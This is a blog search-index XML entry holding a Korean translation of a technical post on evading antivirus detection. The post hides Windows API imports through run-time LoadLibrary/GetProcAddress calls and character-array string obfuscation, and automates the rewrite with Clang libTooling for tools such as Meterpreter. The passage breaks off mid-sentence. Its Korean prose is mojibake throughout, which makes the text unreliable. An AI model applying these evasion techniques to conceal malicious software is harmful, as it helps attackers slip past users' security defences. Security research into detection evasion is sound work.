<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>[Translation] Engineering Antivirus evasion Part.2</title>
    <link href="/2020/12/13/idioth/av_evasion_part2/"/>
    <url>/2020/12/13/idioth/av_evasion_part2/</url>
    
    <content type="html"><![CDATA[<p>ì €ë²ˆì— ì˜¬ë ¸ë˜ Engineering Antivirus evasionë¥¼ ì´ì–´ì„œ Part 2ì˜ ë²ˆì—­ë³¸ë„ ë“¤ê³  ì™”ìŠµë‹ˆë‹¤.</p><p>ì €ë²ˆì˜ ë°œ ë²ˆì—­ì— ì´ì–´ì„œ ì´ë²ˆì—ë„ ì˜ì—­ê³¼ ì˜¤ì—­ì´ ë‚œë¬´í•˜ëŠ” ê¸€ì´ë¯€ë¡œ ê¸€ì´ ì´í•´ê°€ ì•ˆ ë˜ì‹œê±°ë‚˜ ì–˜ê°€ ì™œ ì´ë ‡ê²Œ ì¼ëŠ”ì§€ ì´í•´ê°€ ì•ˆ ë˜ì‹œëŠ” ë¶€ë¶„ì´ ìˆìœ¼ì‹œë©´ ë°”ë¡œ ì§€ì í•´ì£¼ì‹œê¸° ë°”ëë‹ˆë‹¤!</p><blockquote><p>ì›ë¬¸ê¸€ : <a href="https://blog.scrt.ch/2020/07/15/engineering-antivirus-evasion-part-ii/">Engineering antivirus evasion (Part II)</a></p></blockquote><p><strong>tl;dr</strong> ì†Œí”„íŠ¸ì›¨ì–´ëŠ” Windows ìš´ì˜ ì²´ì œì™€ ìƒí˜¸ ì‘ìš©í•˜ê¸° ìœ„í•´ ë™ì  ë§í¬ ë¼ì´ë¸ŒëŸ¬ë¦¬(DLL)ë¥¼ í†µí•´ í•¨ìˆ˜ë¥¼ ê°€ì ¸ì˜¨ë‹¤. ì´ í•¨ìˆ˜ë“¤ì€ Import Address Table í…Œì´ë¸”ì— í‰ë¬¸ìœ¼ë¡œ ì‘ì„±ë˜ê³  ì•ˆí‹°ë°”ì´ëŸ¬ìŠ¤ ì†Œí”„íŠ¸ì›¨ì–´ëŠ” ì´ë¥¼ í™œìš©í•˜ì—¬ ì•…ì˜ì ì¸ í™œë™ì„ íƒì§€í•œë‹¤. ìš°ë¦¬ëŠ” Meterpreterë¥¼ ì¤‘ì‹¬ìœ¼ë¡œ C/C++ ì†Œí”„íŠ¸ì›¨ì–´ë¥¼ refactoring í•˜ì—¬ ì´ëŸ¬í•œ footprintë¥¼ ì œê±°í•  ìˆ˜ ìˆëŠ” ë‚œë…í™” ì•„ì´ë””ì–´ì™€ êµ¬í˜„ì„ ë³´ì—¬ì¤€ë‹¤. ì†ŒìŠ¤ ì½”ë“œëŠ” <a href="https://github.com/scrt/avcleaner">https://github.com/scrt/avcleaner</a>ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</p><h2 id="ì†Œê°œ"><a href="#ì†Œê°œ" class="headerlink" title="ì†Œê°œ"></a>ì†Œê°œ</h2><p>ì´ì „ ê¸€ì—ì„œ ì •ê·œì‹ì„ ì‚¬ìš©í•˜ì§€ ì•Šê³  ì†ŒìŠ¤ ì½”ë“œì—ì„œ ë¬¸ìì—´ ë¦¬í„°ëŸ´ì„ ë°”ê¾¸ëŠ” ë°©ë²•ì„ ë³´ì—¬ì¤¬ë‹¤. ë°”ì´ë„ˆë¦¬ì˜ footprintë¥¼ ì¤„ì´ê³  ì •ì  ì‹œê·¸ë‹ˆì²˜ì— ì˜ì¡´í•˜ëŠ” ë³´ì•ˆ ì†Œí”„íŠ¸ì›¨ì–´ë¥¼ ìš°íšŒí•˜ëŠ” ê²ƒì´ ëª©ì ì´ë‹¤.</p><p>ê·¸ëŸ¬ë‚˜ ì†ŒìŠ¤ ì½”ë“œì˜ ë¬¸ìì—´ ë¦¬í„°ëŸ´ ë§ê³ ë„ ì •ì ìœ¼ë¡œ ìˆ˜ì§‘í•˜ê³  ë¶„ì„í•  ìˆ˜ ìˆëŠ” ì •ë³´ë“¤ì´ ë§ë‹¤. ì´ ê¸€ì€ ë°”ì´ë„ˆë¦¬ì—ì„œ API importë¥¼ ìˆ¨ê¸°ëŠ” ë°©ë²•ê³¼ C/C++ë¡œ ì‘ì„±ëœ ëª¨ë“  ì†Œí”„íŠ¸ì›¨ì–´ì—ì„œ ê·¸ ì‘ì—…ì„ ìë™í™”í•˜ëŠ” ë°©ë²•ì— ëŒ€í•´ì„œ ë‹¤ë£° ê²ƒì´ë‹¤.</p><h2 id="API-importsì˜-ë¬¸ì œì "><a href="#API-importsì˜-ë¬¸ì œì " class="headerlink" title="API importsì˜ ë¬¸ì œì "></a>API importsì˜ ë¬¸ì œì </h2><p>ê°„ë‹¨í•œ C í”„ë¡œê·¸ë¨ì„ ì•„ë˜ì™€ ê°™ì´ ì‘ì„±í•˜ê³  ë¹Œë“œí•˜ì</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span> </span>&#123;     MessageBox(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-string">&quot;Something&quot;</span>, MB_OK);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>ê·¸ë¦¬ê³  ê°€ì¥ ì¢‹ì•„í•˜ëŠ” ì»´íŒŒì¼ëŸ¬ë¡œ ë¹Œë“œí•´ë¼. MinGWëŠ” <em>macOS</em>ì—ì„œ <em>Windows</em>ë¡œ í¬ë¡œìŠ¤ ë¹Œë“œë¥¼ í•˜ëŠ” ë° ì‚¬ìš©ëœë‹¤.</p><pre><code class="hljs bash">x86_64-w64-mingw32-gcc test.c -o /tmp/toto.exe</code></pre><p>ê·¸ í›„ì— rabin2(radare2ì— í¬í•¨ë˜ì–´ ìˆìŒ) ë˜ëŠ” GNU strings ìœ í‹¸ë¦¬í‹°ë¥¼ ì‚¬ìš©í•˜ì—¬ ë¬¸ìì—´ì„ ë¦¬ìŠ¤íŠ¸ í•  ìˆ˜ ìˆë‹¤.</p><pre><code class="hljs bash">rabin2 -zz /tmp/toto.exe | bat</code></pre><pre><code class="hljs bash"> 205   â”‚ 201  0x00003c92 0x00408692 7   8    .idata        ascii   strncmp 206   â”‚ 202  0x00003c9c 0x0040869c 8   9    .idata        ascii   vfprintf 207   â”‚ 203  0x00003ca8 0x004086a8 11  12   .idata        ascii   MessageBoxA 208   â”‚ 204  0x00003d10 0x00408710 12  13   .idata        ascii   KERNEL32.dll 209   â”‚ 205  0x00003d84 0x00408784 10  11   .idata        ascii   msvcrt.dll 210   â”‚ 206  0x00003d94 0x00408794 10  11   .idata        ascii   USER32.dll...9557   â”‚ 9553 0x0004f481 0x00458e81 30  31                 ascii   .refptr.__native_startup_state9558   â”‚ 9554 0x0004f4a0 0x00458ea0 11  12                 ascii   __ImageBase9559   â”‚ 9555 0x0004f4ac 0x00458eac 11  12                 ascii   MessageBoxA9560   â”‚ 9556 0x0004f4b8 0x00458eb8 12  13                 ascii   GetLastError9561   â”‚ 9557 0x0004f4c5 0x00458ec5 17  18                 ascii   __imp_MessageBoxA9562   â”‚ 9558 0x0004f4d7 0x00458ed7 23  24                 ascii   GetSystemTimeAsFileTime9563   â”‚ 9559 0x0004f4ef 0x00458eef 22  23                 ascii   mingw_initltssuo_force9564   â”‚ 9560 0x0004f506 0x00458f06 19  20                 ascii   __rt_psrelocs_start</code></pre><p>ì´ í•¨ìˆ˜ë¥¼ <code>User32.dll</code> ë¼ì´ë¸ŒëŸ¬ë¦¬ì—ì„œ ê°€ì ¸ì™€ì•¼ í•˜ë¯€ë¡œ MessageBoxA ë¬¸ìì—´ì€ 3ë²ˆ ë‚˜íƒ€ë‚œë‹¤.(ë’¤ì—ì„œ ìì„¸íˆ ì„¤ëª…)</p><p>MessageBoxA ë¬¸ìì—´ì€ ì•ˆí‹°ë°”ì´ëŸ¬ìŠ¤ì—ì„œ ê°ì§€ë˜ì§€ ì•Šì§€ë§Œ ë‹¤ìŒ APIë“¤ì€ ê°ì§€ë  ê²ƒì´ë‹¤.</p><ul><li>InternetReadFile</li><li>ShellExecute</li><li>CreateRemoteThread</li><li>OpenProcess</li><li>ReadProcessMemory</li><li>WriteProcessMemory</li><li>â€¦</li></ul><h2 id="API-imports-ìˆ¨ê¸°ê¸°"><a href="#API-imports-ìˆ¨ê¸°ê¸°" class="headerlink" title="API imports ìˆ¨ê¸°ê¸°"></a>API imports ìˆ¨ê¸°ê¸°</h2><p>ìœˆë„ìš° ì‹œìŠ¤í…œì—ì„œ ê°œë°œìë“¤ì´ ì™¸ë¶€ ë¼ì´ë¸ŒëŸ¬ë¦¬ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ë°©ë²•ë“¤ì€ ë‹¤ìŒê³¼ ê°™ë‹¤.</p><ul><li>Load-time dynamic linking</li><li>Run-time dynamic linking</li></ul><h3 id="Load-time-dynamic-linking"><a href="#Load-time-dynamic-linking" class="headerlink" title="Load-time dynamic linking"></a>Load-time dynamic linking</h3><p>ì™¸ë¶€ ë¼ì´ë¸ŒëŸ¬ë¦¬ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ” ê¸°ë³¸ì ì¸ ë°©ë²•ì´ë©° ë§ì»¤ì— ì˜í•´ ìë™ì ìœ¼ë¡œ ì²˜ë¦¬ëœë‹¤. ë¹Œë“œ ì‚¬ì´í´ ë™ì•ˆ ì• í”Œë¦¬ì¼€ì´ì…˜ì€ ê° ë™ì  ë§í¬ ë¼ì´ë¸ŒëŸ¬ë¦¬(DLL)ì˜ import library(.lib)ì— ì—°ê²°ëœë‹¤. ê°€ì ¸ì˜¨ ê° í•¨ìˆ˜ì— ëŒ€í•´ ë§ì»¤ëŠ” DLLì— ëŒ€í•œ ë‚´ìš©ì„ IATì— ì—”íŠ¸ë¦¬ë¥¼ ì‘ì„±í•œë‹¤.</p><p>ì• í”Œë¦¬ì¼€ì´ì…˜ì´ ì‹œì‘ë  ë•Œ, ìš´ì˜ì²´ì œëŠ” IATë¥¼ íƒìƒ‰í•˜ì—¬ í”„ë¡œì„¸ìŠ¤ì˜ ì£¼ì†Œ ê³µê°„ì— ìˆëŠ” ëª¨ë“  ë¼ì´ë¸ŒëŸ¬ë¦¬ ë¦¬ìŠ¤íŠ¸ë¥¼ ë§¤í•‘í•˜ê³  ê°€ì ¸ì˜¨ ê° í•¨ìˆ˜ì˜ ì£¼ì†ŒëŠ” DLLì˜ Export Address Tableì— í•´ë‹¹ ì—”íŠ¸ë¦¬ë¥¼ ê°€ë¦¬í‚¤ë„ë¡ ì—…ë°ì´íŠ¸ëœë‹¤.</p><p><img src="/2020/12/13/idioth/av_evasion_part2/0.png"></p><p>Import Address Table (IAT)</p><h3 id="Run-time-dynamic-linking"><a href="#Run-time-dynamic-linking" class="headerlink" title="Run-time dynamic linking"></a>Run-time dynamic linking</h3><p>ë‹¤ë¥¸ ë°©ë²•ì€ LoadLibraryë¡œ í•´ë‹¹ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ë¡œë“œí•œ í›„ GetProcAddressë¡œ í•¨ìˆ˜ì˜ ì£¼ì†Œë¥¼ ì–»ì–´ ìˆ˜ë™ì ìœ¼ë¡œ ìˆ˜í–‰í•˜ëŠ” ê²ƒì´ë‹¤. ì˜ˆë¥¼ ë“¤ì–´ ìœ„ì˜ ì˜ˆì‹œë¥¼ run-time dynamic linkingì„ ì ìš©í•  ìˆ˜ ìˆë‹¤.</p><p>ë¨¼ì € MessageBoxA APIì˜ í•¨ìˆ˜ í¬ì¸í„°ë¥¼ ì •ì˜í•´ì•¼ í•œë‹¤. ì‹œì‘í•˜ê¸° ì „ì— Cì˜ í•¨ìˆ˜ í¬ì¸í„° êµ¬ë¬¸ì— ëŒ€í•´ ê°„ë‹¨í•˜ê²Œ ì„¤ëª…í•œë‹¤.</p><pre><code class="hljs cpp">&lt;<span class="hljs-keyword">return</span> type&gt; (*&lt;your pointer name&gt;)(arg1, arg2, ...);</code></pre><p>ë³¼ ìˆ˜ ìˆë“¯ì´ star operator(í•¨ìˆ˜ í¬ì¸í„°ì´ë¯€ë¡œ)ì™€  ê´„í˜¸ë¥¼ ì œì™¸í•˜ë©´ í•¨ìˆ˜ë¥¼ ì •ì˜í•˜ëŠ” êµ¬ë¬¸ê³¼ ê°™ë‹¤.</p><p>ì´ì œ MessageBoxì˜ í”„ë¡œí† íƒ€ì…ì´ í•„ìš”í•œë° Windows SDKì˜ <code>winuser.h</code> í˜¹ì€ <a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messagebox">MSDN</a>ì—ì„œ ì°¾ì„ ìˆ˜ ìˆë‹¤.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">MessageBox</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  HWND    hWnd,</span></span><span class="hljs-function"><span class="hljs-params">  LPCTSTR lpText,</span></span><span class="hljs-function"><span class="hljs-params">  LPCTSTR lpCaption,</span></span><span class="hljs-function"><span class="hljs-params">  UINT    uType</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre><p>ì•ì„œ ë§í•œ í•¨ìˆ˜ í¬ì¸í„° êµ¬ë¬¸ì€ ì •í™•í•œ ì •ë³´ë¡œ ì—…ë°ì´íŠ¸í•  ìˆ˜ ìˆë‹¤.</p><pre><code class="hljs cpp"><span class="hljs-keyword">int</span> (*_MessageBoxA)(    HWND hWnd,    LPCTSTR lpText,    LPCTSTR lpCaption,    UINT uType);</code></pre><p>MSDNì€ ì´ í•¨ìˆ˜ê°€ <code>User32.dll</code>ì—ì„œ ë‚´ë³´ë‚´ì§„ ë‹¤ê³  ì„¤ëª…í•œë‹¤.</p><p><img src="/2020/12/13/idioth/av_evasion_part2/1.png"></p><p>MessageBoxA APIëŠ” <code>User32.dll</code>ì—ì„œ ë‚´ë³´ë‚´ ì§„ë‹¤. ë”°ë¼ì„œ ì• í”Œë¦¬ì¼€ì´ì…˜ì€ ì´ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ë¨¼ì € ë¡œë“œí•´ì•¼ í•œë‹¤.</p><pre><code class="hljs cpp">HANDLE hUser32 = LoadLibrary(<span class="hljs-string">&quot;User32.dll&quot;</span>);</code></pre><p>ê·¸ í›„ <code>GetProcAddress</code>ë¥¼ ì‚¬ìš©í•˜ì—¬ ìœ„ì—ì„œ ì •ì˜í•œ í•¨ìˆ˜ í¬ì¸í„°ì— ì •í™•í•œ ì£¼ì†Œë¥¼ í• ë‹¹í•  ìˆ˜ ìˆë‹¤.</p><pre><code class="hljs cpp">_MessageBoxA fMessageBoxA = (_MessageBoxA) GetProcAddress(hUser32, <span class="hljs-string">&quot;MessageBoxA&quot;</span>);</code></pre><p>ì—¬ê¸°ì„œ ì›ë˜ ì˜ˆë¥¼ <code>MessageBoxA</code> ëŒ€ì‹  <code>fMessageBoxA</code>ë¥¼ í˜¸ì¶œí•˜ë„ë¡ ìˆ˜ì •í•´ì•¼ í•˜ë©° ë‹¤ìŒê³¼ ê°™ë‹¤.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(*_MessageBoxA)</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  HWND    hWnd,</span></span><span class="hljs-function"><span class="hljs-params">  LPCTSTR lpText,</span></span><span class="hljs-function"><span class="hljs-params">  LPCTSTR lpCaption,</span></span><span class="hljs-function"><span class="hljs-params">  UINT    uType</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span> </span>&#123;    HANDLE hUser32 = LoadLibraryA(<span class="hljs-string">&quot;User32.dll&quot;</span>);    _MessageBoxA fMessageBoxA = (_MessageBoxA) GetProcAddress(hUser32, <span class="hljs-string">&quot;MessageBoxA&quot;</span>);    fMessageBoxA(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-string">&quot;Something&quot;</span>, MB_OK);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p><code>HWND, LCTSTR, UINT</code> ë°ì´í„° íƒ€ì…ì„ ìœ„í•´ <code>Windows.h</code> includeê°€ í•„ìš”í•˜ë‹¤. ì´ ê°„ë‹¨í•œ ì˜ˆì œë¥¼ ë¹Œë“œí•˜ê³  ì‹¤í–‰í•˜ë©´ ì˜ˆìƒëŒ€ë¡œ alert boxê°€ ì‹¤í–‰ëœë‹¤.</p><p><img src="/2020/12/13/idioth/av_evasion_part2/2.png"></p><p>run-time dynamic linkingì„ í•˜ê¸° ìœ„í•´ <code>LoadLibrary</code>ì™€ <code>GetProcAddress</code>ì„ ì‚¬ìš©í•˜ëŠ” ê°„ë‹¨í•œ ì˜ˆì‹œ</p><h3 id="ìµœì¢…-ì ìš©"><a href="#ìµœì¢…-ì ìš©" class="headerlink" title="ìµœì¢… ì ìš©"></a>ìµœì¢… ì ìš©</h3><p><code>strings toto.exe</code>ë¥¼ ì‹¤í–‰í•˜ë©´ ì•„ì§ <code>User32.dll</code>ê³¼ <code>MessageBoxA</code> ë¬¸ìì—´ì´ ë‚˜íƒ€ë‚œë‹¤. ì´ ë¬¸ìì—´ë“¤ì€ ì•”í˜¸í™”ë˜ì–´ì•¼ í•˜ì§€ë§Œ ì´ì „ ê¸€ì—ì„œ ë³´ì—¬ì¤€ ê°„ë‹¨í•œ ë‚œë…í™” íŠ¸ë¦­ìœ¼ë¡œ ì•ˆí‹°ë°”ì´ëŸ¬ìŠ¤ íƒì§€ë¥¼ ìš°íšŒí•  ìˆ˜ ìˆë‹¤. ìµœì¢… ê²°ê³¼ëŠ” ë‹¤ìŒê³¼ ê°™ë‹¤.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(*_MessageBoxA)</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  HWND    hWnd,</span></span><span class="hljs-function"><span class="hljs-params">  LPCTSTR lpText,</span></span><span class="hljs-function"><span class="hljs-params">  LPCTSTR lpCaption,</span></span><span class="hljs-function"><span class="hljs-params">  UINT    uType</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span> </span>&#123;    <span class="hljs-keyword">char</span> user32[] = &#123;<span class="hljs-string">&#x27;U&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-number">0</span>&#125;;    HANDLE hUser32 = LoadLibraryA(user32);    <span class="hljs-keyword">char</span> messabox[] = &#123;<span class="hljs-string">&#x27;M&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;g&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-number">0</span>&#125;;    _MessageBoxA fMessageBoxA = (_MessageBoxA) GetProcAddress(hUser32, messabox);    fMessageBoxA(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-string">&quot;Something&quot;</span>, MB_OK);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>ì´ë²ˆì—ëŠ” <code>strings</code>ì™€ <code>rabin2</code> ë‘˜ ë‹¤ ë¬¸ìì—´ì„ ì°¾ì„ ìˆ˜ ì—†ë‹¤.</p><pre><code class="hljs cpp">âœ  x86_64-w64-mingw32-gcc test.c -o /tmp/toto.exeâœ  strings /tmp/toto.exe | grep MessageBoxâœ  rabin2 -zz /tmp/toto.exe | grep MessageBoxâœ</code></pre><h2 id="ìë™í™”ëœ-ì†ŒìŠ¤-ì½”ë“œ-ë¦¬íŒ©í„°ë§"><a href="#ìë™í™”ëœ-ì†ŒìŠ¤-ì½”ë“œ-ë¦¬íŒ©í„°ë§" class="headerlink" title="ìë™í™”ëœ ì†ŒìŠ¤ ì½”ë“œ ë¦¬íŒ©í„°ë§"></a>ìë™í™”ëœ ì†ŒìŠ¤ ì½”ë“œ ë¦¬íŒ©í„°ë§</h2><p>ì´ì „ ê¸€ì— ì„¤ëª…ëœ ê²ƒê³¼ ê°™ì€ ë°©ë²•ìœ¼ë¡œ ê¸°ì¡´ ì½”ë“œ ë² ì´ìŠ¤ë¥¼ refactoring í•˜ì—¬ ì˜ì‹¬ìŠ¤ëŸ¬ìš´ APIë¥¼ ëŸ°íƒ€ì„ì— ë¡œë“œí•˜ê³  Import Address Tableì—ì„œ ì œê±°í•  ìˆ˜ ìˆë‹¤. <code>libTooling</code>ìœ¼ë¡œ êµ¬í˜„ëœ ê¸°ì¡´ì˜ ì‘ì—…ì„ ê¸°ë°˜ìœ¼ë¡œ í•  ê²ƒì´ë‹¤.</p><p>ì´ ì‘ì—…ì„ ë‹¤ìŒê³¼ ê°™ì´ ë‚˜ì—´í•´ë³´ì.</p><ul><li>ì´ì „ ì˜ˆì œì˜ ì¶”ìƒ êµ¬ë¬¸ íŠ¸ë¦¬ë¥¼ ìƒì„±í•´ë¼. í•¨ìˆ˜ í˜¸ì¶œì„ ìˆ˜ì •í•˜ê¸° ìœ„í•´ ë…¸ë“œë¥¼ ì¡°ì‘í•˜ëŠ” ë°©ë²•ì„ ì´í•´í•˜ëŠ”ë° í•„ìš”í•˜ë‹¤.</li><li><a href="https://clang.llvm.org/docs/LibASTMatchersReference.html">ASTMatcher</a>ë¥¼ ì‚¬ìš©í•˜ì—¬ ì§€ì •ëœ APIì— ëŒ€í•œ API ì½”ë“œ ë² ì´ìŠ¤ì˜ ëª¨ë“  í•¨ìˆ˜ í˜¸ì¶œì„ ì°¾ì•„ë¼.</li><li>ë‹¤ë¥¸ í•¨ìˆ˜ ì‹ë³„ìë¡œ ëª¨ë“  í˜¸ì¶œì„ ëŒ€ì²´í•´ë¼.</li><li>ê° í•¨ìˆ˜ í˜¸ì¶œ ì „ì— <code>LoadLibrary/GetProcAddress</code> í˜¸ì¶œì„ ì‚½ì…í•˜ë¼.</li><li>ì‘ë™í•˜ëŠ”ì§€ í™•ì¸í•´ë¼.</li><li>ëª¨ë“  ì˜ì‹¬ìŠ¤ëŸ¬ìš´ APIë¥¼ ì¢…í•©í•˜ê³  ë‚œë…í™”í•´ë¼.</li></ul><h3 id="MessageBox-ì• í”Œë¦¬ì¼€ì´ì…˜ì˜-ì¶”ìƒ-êµ¬ë¬¸-íŠ¸ë¦¬"><a href="#MessageBox-ì• í”Œë¦¬ì¼€ì´ì…˜ì˜-ì¶”ìƒ-êµ¬ë¬¸-íŠ¸ë¦¬" class="headerlink" title="MessageBox ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ì¶”ìƒ êµ¬ë¬¸ íŠ¸ë¦¬"></a>MessageBox ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ì¶”ìƒ êµ¬ë¬¸ íŠ¸ë¦¬</h3><p>ì›ë³¸ MessageBox ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ Clang ì¶”ìƒ êµ¬ë¬¸ íŠ¸ë¦¬ë¥¼ ë³´ê¸° ìœ„í•´ ë‹¹ì‹ ì˜ Windows SDK ê²½ë¡œë¥¼ ì ìš©í•˜ì—¬ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚¬ìš©í•˜ì</p><pre><code class="hljs cpp">WIN_INCLUDE=<span class="hljs-string">&quot;/Users/vladimir/dev/avcleaner&quot;</span>CLANG_PATH=<span class="hljs-string">&quot;/usr/local/Cellar/llvm/9.0.1&quot;</span>clang -cc1 -ast-dump <span class="hljs-string">&quot;$1&quot;</span> -D <span class="hljs-string">&quot;_WIN64&quot;</span> -D <span class="hljs-string">&quot;_UNICODE&quot;</span> -D <span class="hljs-string">&quot;UNICODE&quot;</span> -D <span class="hljs-string">&quot;_WINSOCK_DEPRECATED_NO_WARNINGS&quot;</span>\  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$CLANG_PATH/include&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$CLANG_PATH&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/msvc-14.15.26726-include&quot;</span>\  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/ucrt&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/shared&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/um&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/winrt&quot;</span> \  <span class="hljs-string">&quot;-fdeprecated-macro&quot;</span> \  <span class="hljs-string">&quot;-w&quot;</span> \  <span class="hljs-string">&quot;-fdebug-compilation-dir&quot;</span>\  <span class="hljs-string">&quot;-fno-use-cxa-atexit&quot;</span> <span class="hljs-string">&quot;-fms-extensions&quot;</span> <span class="hljs-string">&quot;-fms-compatibility&quot;</span> \  <span class="hljs-string">&quot;-fms-compatibility-version=19.15.26726&quot;</span> <span class="hljs-string">&quot;-std=c++14&quot;</span> <span class="hljs-string">&quot;-fdelayed-template-parsing&quot;</span> <span class="hljs-string">&quot;-fobjc-runtime=gcc&quot;</span> <span class="hljs-string">&quot;-fcxx-exceptions&quot;</span> <span class="hljs-string">&quot;-fexceptions&quot;</span> <span class="hljs-string">&quot;-fseh-exceptions&quot;</span> <span class="hljs-string">&quot;-fdiagnostics-show-option&quot;</span> <span class="hljs-string">&quot;-fcolor-diagnostics&quot;</span> <span class="hljs-string">&quot;-x&quot;</span> <span class="hljs-string">&quot;c++&quot;</span></code></pre><pre><code class="hljs bash">bash clang-astdump.sh <span class="hljs-built_in">test</span>/messagebox_simple.c &gt; <span class="hljs-built_in">test</span>/messagebox_simple.c.ast</code></pre><p><img src="/2020/12/13/idioth/av_evasion_part2/3.png"></p><p>MessageBoxA APIë¥¼ í˜¸ì¶œí•˜ëŠ” ê°„ë‹¨í•œ ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ Clang ì¶”ìƒ êµ¬ë¬¸ íŠ¸ë¦¬</p><p>CallExpr ìœ í˜•ì˜ AST ë…¸ë“œë¥¼ ì°¾ìœ¼ë©´ ì†ŒìŠ¤ ì½”ë“œì—ì„œì˜ í•¨ìˆ˜ í˜¸ì¶œì„ ì°¾ì„ ìˆ˜ ìˆë‹¤. ìœ„ ì‚¬ì§„ì— ë‚˜ì™€ìˆëŠ” ê²ƒì²˜ëŸ¼ ì‹¤ì œ í˜¸ì¶œë˜ëŠ” í•¨ìˆ˜ ì´ë¦„ì€ í•˜ìœ„ ë…¸ë“œ ì¤‘ í•˜ë‚˜ì— ì§€ì •ë˜ì–´ ìˆìœ¼ë¯€ë¡œ ë‚˜ì¤‘ì— ì ‘ê·¼í•  ìˆ˜ ìˆì–´ì•¼ í•œë‹¤.</p><h3 id="íŠ¹ì •-APIì˜-í•¨ìˆ˜-í˜¸ì¶œ-ì°¾ê¸°"><a href="#íŠ¹ì •-APIì˜-í•¨ìˆ˜-í˜¸ì¶œ-ì°¾ê¸°" class="headerlink" title="íŠ¹ì • APIì˜ í•¨ìˆ˜ í˜¸ì¶œ ì°¾ê¸°"></a>íŠ¹ì • APIì˜ í•¨ìˆ˜ í˜¸ì¶œ ì°¾ê¸°</h3><p><a href="https://clang.llvm.org/docs/LibASTMatchersReference.html">ASTMatcher</a>ëŠ” íŠ¹ì • í•¨ìˆ˜ì— ëŒ€í•œ ëª¨ë“  í•¨ìˆ˜ í˜¸ì¶œì„ ì—´ê±°í•˜ëŠ”ë° í•„ìš”í•˜ë‹¤. ìš°ì„  ì´ì „ ê¸€ì—ì„œ ì‚¬ìš©ëœ ê²ƒë³´ë‹¤ ë” ë³µì¡í•˜ë¯€ë¡œ ì´ matcherì— ë§ëŠ” êµ¬ë¬¸ì„ ì–»ëŠ” ê²ƒì´ ì¤‘ìš”í•˜ë‹¤. ì í•©í•œ ê²ƒì„ 